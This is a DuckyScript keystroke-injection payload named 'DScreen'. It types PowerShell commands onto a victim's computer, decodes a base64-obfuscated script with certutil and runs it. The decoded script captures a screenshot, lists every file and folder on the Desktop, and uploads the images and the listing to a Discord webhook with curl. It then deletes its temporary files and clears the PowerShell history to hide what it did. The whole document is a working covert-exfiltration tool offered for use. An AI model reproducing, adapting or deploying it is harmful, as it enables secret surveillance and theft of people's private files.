REM Title      : DScreen
REM Description: Scans Desktop and all directories on it, takes a screenshot of Desktop and saves all files, folders and applications names to a .txt and uploads to Discord via webhook. 
REM Author     : dag
REM Version    : 0.0.5
REM Generated by REDD's Encrypted Payload Generator
REM - It is highly suggested you adjust the DELAYS for your use.
DELAY 2000
GUI r
DELAY 200
STRING powershell
DELAY 500
ENTER
DELAY 5000
STRING $webhook = "DiscordWebhook";
DELAY 5000
STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo JGRpcmVjdG9yeVRvU2NhbiA9ICIkZW52OlRFTVBcRTNKazNrdnciDQppZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICRkaXJlY3RvcnlUb1NjYW4pKSB7DQogICAgTmV3LUl0ZW0gLVBhdGggJGRpcmVjdG9yeVRvU2NhbiAtSXRlbVR5cGUgRGlyZWN0b3J5DQp9DQokc2NyaXB0ID0gQCcNCiAgICRwbGF5ZXIgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgJ01lZGlhUGxheWVyLk1lZGlhUGxheWVyJw0KICAgJHBsYXllci5PcGVuKCJodHRwczovL2F1ZGlvLmp1a2Vob3N0LmNvLnVrL1JPUVFhc3pmSklITnlhb3NzT0VPWVcyOXk0VXNBUEFEIikNCiAgICRwbGF5ZXINCidADQokcnVuc3BhY2UgPSBbUnVuc3BhY2VGYWN0b3J5XTo6Q3JlYXRlUnVuc3BhY2UoKQ0KJHJ1bnNwYWNlLkFwYXJ0bWVudFN0YXRlID0gIk1UQSINCiRiZ1Bvd2VyU2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpDQokYmdQb3dlclNoZWxsLlJ1bnNwYWNlID0gJHJ1bnNwYWNlDQokcnVuc3BhY2UuT3BlbigpDQokcGxheWVyID0gQCgkYmdQb3dlclNoZWxsLkFkZFNjcmlwdCgkc2NyaXB0KS5JbnZva2UoKSlbMF0NCnRyeQ0Kew0KICAgIA0KICAgIHdoaWxlKCR0cnVlKQ0KICAgIHsNCiAgICAgICAgU3RhcnQtU2xlZXAgLW0gNTAwDQogICAgICAgIGlmKCRwbGF5ZXIuSGFzRXJyb3IgLW9yICgkcGxheWVyLlJlYWR5U3RhdGUgLWVxIDQpKSB7IGJyZWFrIH0NCiAgICB9DQogICAgU3RhcnQtU2xlZXAgLXMgNg0KfQ0KZmluYWxseQ0Kew0KICAgICRwbGF5ZXIuU3RvcCgpDQogICAgJGJnUG93ZXJTaGVsbC5EaXNwb3NlKCkNCn0NCkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCkFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiBAIg0KICAgIHVzaW5nIFN5c3RlbTsNCiAgICB1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQogICAgcHVibGljIGNsYXNzIE15VXNlcjMyIHsNCiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQ0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiB2b2lkIGtleWJkX2V2ZW50KGJ5dGUgYlZrLCBieXRlIGJTY2FuLCBpbnQgZHdGbGFncywgaW50IGR3RXh0cmFJbmZvKTsNCiAgICB9DQoiQCAtTGFuZ3VhZ2UgQ1NoYXJwDQokVktfTFdJTiA9IDB4NUINCiRWS19EID0gMHg0NA0KJEtFWUVWRU5URl9LRVlET1dOID0gMHgwDQokS0VZRVZFTlRGX0tFWVVQID0gMHgyDQpbTXlVc2VyMzJdOjprZXliZF9ldmVudCgkVktfTFdJTiwgMCwgJEtFWUVWRU5URl9LRVlET1dOLCAwKQ0KW015VXNlcjMyXTo6a2V5YmRfZXZlbnQoJFZLX0QsIDAsICRLRVlFVkVOVEZfS0VZRE9XTiwgMCkNCltNeVVzZXIzMl06OmtleWJkX2V2ZW50KCRWS19ELCAwLCAkS0VZRVZFTlRGX0tFWVVQLCAwKQ0KW015VXNlcjMyXTo6a2V5YmRfZXZlbnQoJFZLX0xXSU4sIDAsICRLRVlFVkVOVEZfS0VZVVAsIDApDQpTdGFydC1TbGVlcCAtU2Vjb25kcyAyDQpBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nDQpmdW5jdGlvbiBUYWtlLVNjcmVlbnNob3Qgew0KICAgICRzY3JlZW5zID0gW1N5c3RlbS5XaW5kb3dzLkZvcm1zLlNjcmVlbl06OkFsbFNjcmVlbnMNCiAgICAkbGVmdCA9IFtpbnRdOjpNYXhWYWx1ZQ0KICAgICR0b3AgPSBbaW50XTo6TWF4VmFsdWUNCiAgICAkcmlnaHQgPSBbaW50XTo6TWluVmFsdWUNCiAgICAkYm90dG9tID0gW2ludF06Ok1pblZhbHVlDQpmb3JlYWNoICgkc2NyZWVuIGluICRzY3JlZW5zKSB7DQogICAgJGJvdW5kcyA9ICRzY3JlZW4uQm91bmRzDQogICAgJGxlZnQgPSBbTWF0aF06Ok1pbigkbGVmdCwgJGJvdW5kcy5MZWZ0KQ0KICAgICR0b3AgPSBbTWF0aF06Ok1pbigkdG9wLCAkYm91bmRzLlRvcCkNCiAgICAkcmlnaHQgPSBbTWF0aF06Ok1heCgkcmlnaHQsICRib3VuZHMuUmlnaHQpDQogICAgJGJvdHRvbSA9IFtNYXRoXTo6TWF4KCRib3R0b20sICRib3VuZHMuQm90dG9tKQ0KfQ0KICAgICR3aWR0aCA9ICRyaWdodCAtICRsZWZ0DQogICAgJGhlaWdodCA9ICRib3R0b20gLSAkdG9wDQogICAgJGJtcCA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuQml0bWFwICR3aWR0aCwgJGhlaWdodA0KICAgICRncmFwaGljcyA9IFtTeXN0ZW0uRHJhd2luZy5HcmFwaGljc106OkZyb21JbWFnZSgkYm1wKQ0KICAgICRncmFwaGljcy5Db3B5RnJvbVNjcmVlbigkbGVmdCwgJHRvcCwgMCwgMCwgJGJtcC5TaXplKQ0KICAgICRzY3JlZW5zaG90UGF0aCA9ICIkZW52OlRFTVBcRTNKazNrdndcc2NyZWVuc2hvdC5wbmciDQogICAgJGJtcC5TYXZlKCRzY3JlZW5zaG90UGF0aCkNCiAgICAkZ3JhcGhpY3MuRGlzcG9zZSgpDQogICAgJGJtcC5EaXNwb3NlKCkNCiAgICByZXR1cm4gJHNjcmVlbnNob3RQYXRoDQp9DQpUYWtlLVNjcmVlbnNob3QNCmZ1bmN0aW9uIEdldC1EZXNrdG9wSXRlbXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kcGF0aCwNCiAgICAgICAgW2ludF0kaW5kZW50TGV2ZWwgPSAwDQogICAgKQ0KICAgICR0eHRQYXRoID0gIiRlbnY6VEVNUFxFM0prM2t2d1xEZXNrdG9wSXRlbXMudHh0Ig0KICAgICRpdGVtcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJHBhdGgNCiAgICBmb3JlYWNoICgkaXRlbSBpbiAkaXRlbXMpIHsNCiAgICAgICAgJGluZGVudGVkTmFtZSA9ICgiICAgICIgKiAkaW5kZW50TGV2ZWwpICsgJGl0ZW0uTmFtZQ0KICAgICAgICBXcml0ZS1Ib3N0ICJEZWJ1ZzogSW5kZW50ZWQgbmFtZSB0byBhZGQ6ICckaW5kZW50ZWROYW1lJyINCiAgICAgICAgQWRkLUNvbnRlbnQgLVBhdGggJHR4dFBhdGggLVZhbHVlICRpbmRlbnRlZE5hbWUNCiAgICAgICAgaWYgKCRpdGVtLlBTSXNDb250YWluZXIpIHsNCiAgICAgICAgICAgIFdyaXRlLUhvc3QgIkRlYnVnOiBUcmF2ZXJzaW5nIGludG8gZm9sZGVyICQoJGl0ZW0uRnVsbE5hbWUpIg0KICAgICAgICAgICAgR2V0LURlc2t0b3BJdGVtcyAtcGF0aCAkaXRlbS5GdWxsTmFtZSAtaW5kZW50TGV2ZWwgKCRpbmRlbnRMZXZlbCArIDEpDQogICAgICAgIH0NCiAgICB9DQp9DQokdHh0UGF0aCA9ICIkZW52OlRFTVBcRTNKazNrdndcRGVza3RvcEl0ZW1zLnR4dCINCmlmIChUZXN0LVBhdGggJHR4dFBhdGgpIHsNCiAgICBDbGVhci1Db250ZW50IC1QYXRoICR0eHRQYXRoDQp9IGVsc2Ugew0KICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBGaWxlIC1QYXRoICR0eHRQYXRoDQp9DQokZGVza3RvcFBhdGggPSBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnRGVza3RvcCcpDQpHZXQtRGVza3RvcEl0ZW1zIC1wYXRoICRkZXNrdG9wUGF0aA0KV3JpdGUtSG9zdCAiVGV4dCBmaWxlIHNhdmVkIGF0OiAkdHh0UGF0aCINCkdldC1DaGlsZEl0ZW0gLVBhdGggJGRpcmVjdG9yeVRvU2NhbiAtUmVjdXJzZSB8IFdoZXJlLU9iamVjdCB7IA0KICAgICRfLkV4dGVuc2lvbiAtZXEgJy5wbmcnIC1vciANCiAgICAkXy5FeHRlbnNpb24gLWVxICcuanBnJyAtb3IgDQogICAgJF8uRXh0ZW5zaW9uIC1lcSAnLmpwZWcnIC1vciANCiAgICAkXy5FeHRlbnNpb24gLWVxICcuZ2lmJyAtb3IgDQogICAgJF8uRXh0ZW5zaW9uIC1lcSAnLmJtcCcgLW9yIA0KICAgICRfLkV4dGVuc2lvbiAtZXEgJy50aWZmJyAtb3IgDQogICAgJF8uRXh0ZW5zaW9uIC1lcSAnLndlYnAnDQp9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICRsb2cgPSAkXy5GdWxsTmFtZQ0KICAgICRmaWxlbmFtZSA9ICRfLk5hbWUNCiAgICAkaGV4Q29sb3IgPSAiNTUyNTgzIg0KICAgICRjb2xvckludCA9IFtjb252ZXJ0XTo6VG9JbnQzMigkaGV4Q29sb3IsIDE2KQ0KICAgICRjdXJyZW50VGltZSA9IChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoInl5eXktTU0tZGRUSEg6bW06c3NaIikNCiAgICAkcGF5bG9hZE9iamVjdCA9IEB7DQogICAgICAgIHVzZXJuYW1lID0gJGVudjpDb21wdXRlck5hbWUNCiAgICAgICAgZW1iZWRzID0gQCgNCiAgICAgICAgICAgIEB7DQogICAgICAgICAgICAgICAgY29sb3IgPSAkY29sb3JJbnQNCiAgICAgICAgICAgICAgICBpbWFnZSA9IEB7DQogICAgICAgICAgICAgICAgICAgIHVybCA9ICJhdHRhY2htZW50Oi8vJGZpbGVuYW1lIg0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICApDQogICAgfQ0KICAgICRwYXlsb2FkSnNvbiA9ICRwYXlsb2FkT2JqZWN0IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDQNCiAgICAkdGVtcEZpbGUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KICAgIFNldC1Db250ZW50IC1QYXRoICR0ZW1wRmlsZSAtVmFsdWUgJHBheWxvYWRKc29uDQogICAgJGN1cmxDb21tYW5kID0gQCgNCiAgICAgICAgJ2N1cmwuZXhlJywNCiAgICAgICAgJy1GJywgKCJwYXlsb2FkX2pzb249PCR0ZW1wRmlsZSIpLA0KICAgICAgICAnLUYnLCAoImZpbGU9QCRsb2c7ZmlsZW5hbWU9JGZpbGVuYW1lIiksDQogICAgICAgICR3ZWJob29rDQogICAgKQ0KICAgICYgJGN1cmxDb21tYW5kWzBdICRjdXJsQ29tbWFuZFsxLi4oJGN1cmxDb21tYW5kLkxlbmd0aCAtIDEpXQ0KICAgIGlmICgkTEFTVEVYSVRDT0RFIC1uZSAwKSB7DQogICAgICAgIFdyaXRlLUhvc3QgIkN1cmwgZXhpdGVkIHdpdGggY29kZSAkTEFTVEVYSVRDT0RFIg0KICAgIH0NCiAgICBSZW1vdmUtSXRlbSAtUGF0aCAkdGVtcEZpbGUNCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAxDQp9DQokcGF5bG9hZE9iamVjdFR4dCA9IEB7DQogICAgdXNlcm5hbWUgPSAkZW52OkNvbXB1dGVyTmFtZQ0KICAgIGVtYmVkcyA9IEAoDQogICAgICAgIEB7DQogICAgICAgICAgICB0aXRsZSA9ICJEZXNrdG9wIg0KICAgICAgICAgICAgZGVzY3JpcHRpb24gPSAiU0NBTiBDT01QTEVURSEiDQogICAgICAgICAgICBjb2xvciA9ICRjb2xvckludA0KICAgICAgICAgICAgdGltZXN0YW1wID0gJGN1cnJlbnRUaW1lDQogICAgICAgIH0NCiAgICApDQp9DQokcGF5bG9hZEpzb25UeHQgPSAkcGF5bG9hZE9iamVjdFR4dCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCA0DQokdGVtcEZpbGVUeHQgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KU2V0LUNvbnRlbnQgLVBhdGggJHRlbXBGaWxlVHh0IC1WYWx1ZSAkcGF5bG9hZEpzb25UeHQNCiRjdXJsQ29tbWFuZFR4dCA9IEAoDQogICAgJ2N1cmwuZXhlJywNCiAgICAnLUYnLCAoInBheWxvYWRfanNvbj08JHRlbXBGaWxlVHh0IiksDQogICAgJy1GJywgKCJmaWxlPUAkdHh0UGF0aDtmaWxlbmFtZT1EZXNrdG9wSXRlbXMudHh0IiksDQogICAgJHdlYmhvb2sNCikNCiYgJGN1cmxDb21tYW5kVHh0WzBdICRjdXJsQ29tbWFuZFR4dFsxLi4oJGN1cmxDb21tYW5kVHh0Lkxlbmd0aCAtIDEpXQ0KaWYgKCRMQVNURVhJVENPREUgLW5lIDApIHsNCiAgICBXcml0ZS1Ib3N0ICJDdXJsIGV4aXRlZCB3aXRoIGNvZGUgJExBU1RFWElUQ09ERSINCn0NClJlbW92ZS1JdGVtIC1QYXRoICR0ZW1wRmlsZVR4dA0KUmVtb3ZlLUl0ZW0gLVBhdGggJGRpcmVjdG9yeVRvU2NhbiAtUmVjdXJzZQ== > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
DELAY 5000
ENTER
STRING Clear-History
ENTER
STRING exit
ENTER
